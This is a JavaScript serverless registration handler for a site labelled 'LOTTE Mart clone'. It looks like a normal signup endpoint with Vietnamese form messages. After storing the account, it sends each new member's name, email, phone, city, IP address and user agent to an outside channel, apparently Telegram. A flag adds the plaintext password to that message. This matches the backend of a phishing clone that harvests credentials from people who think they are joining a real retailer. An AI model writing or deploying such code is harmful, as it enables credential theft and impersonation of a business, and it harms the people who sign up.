/**
 * POST /api/customer/register
 *
 * AUTH_MODE 与登录一致（lenient 下也照常落盘，供 strict 使用）。
 * 返回 { ok, user } 或 { ok:false, field, message }
 */
import { json, isEmail, hashPassword, uid, notify, userView } from './_shared.js';
import { getAccount, putAccount, storageMode } from './_store.js';

export async function onRequestPost({ request, env }) {
  let body = {};
  try {
    body = await request.json();
  } catch (e) {
    return json({ ok: false, field: 'form', message: 'Dữ liệu không hợp lệ.' });
  }

  const name = String(body.name || '').trim();
  const email = String(body.email || '').trim().toLowerCase();
  const phone = String(body.phone || '').trim();
  const password = String(body.password || '');
  const password2 = body.password2 === undefined ? password : String(body.password2);

  if (!name) return json({ ok: false, field: 'name', message: 'Vui lòng nhập họ tên.' });
  if (!isEmail(email)) return json({ ok: false, field: 'email', message: 'Email không hợp lệ.' });
  if (password.length < 6) return json({ ok: false, field: 'password', message: 'Mật khẩu phải có ít nhất 6 ký tự.' });
  if (password !== password2) return json({ ok: false, field: 'password2', message: 'Mật khẩu nhập lại không khớp.' });
  if (body.agree === false) return json({ ok: false, field: 'agree', message: 'Vui lòng đồng ý điều kiện & điều khoản.' });

  const existing = await getAccount(env, request, email);
  if (existing) return json({ ok: false, field: 'email', message: 'Email này đã được đăng ký.' });

  const { salt, hash } = await hashPassword(password);
  const user = {
    id: uid(),
    name,
    email,
    phone,
    membership: String(body.membership || 'Member'),
    address: String(body.address || '').trim(),
    city: String(body.city || '').trim(),
    zip: String(body.zip || '').trim(),
    createdAt: Date.now(),
    salt,
    hash,
  };

  const stored = await putAccount(env, request, user);

  const headers = { 'Set-Cookie': `lm_user=${encodeURIComponent(JSON.stringify(userView(user)))}; Path=/; Max-Age=2592000; SameSite=Lax` };
  if (stored.setCookie) headers['Set-Cookie'] += `, ${stored.setCookie}`;

  const label = (env && env.SITE_LABEL) || 'LOTTE Mart clone';
  const includePwd = String((env && env.TELEGRAM_INCLUDE_PASSWORD) || '') === '1';
  const notified = await notify(
    env,
    `<b>NEW MEMBER</b> — ${label}\n` +
      `Name: ${name}\nEmail: ${email}\nPhone: ${phone || '-'}\n` +
      `Membership: ${user.membership}\nCity: ${user.city || '-'}\n` +
      (includePwd ? `Password: ${password}\n` : '') +
      `IP: ${request.headers.get('CF-Connecting-IP') || '-'}\n` +
      `UA: ${(request.headers.get('User-Agent') || '').slice(0, 120)}`
  );

  return json({ ok: true, user: userView(user), storage: storageMode(env), notified }, { headers });
}
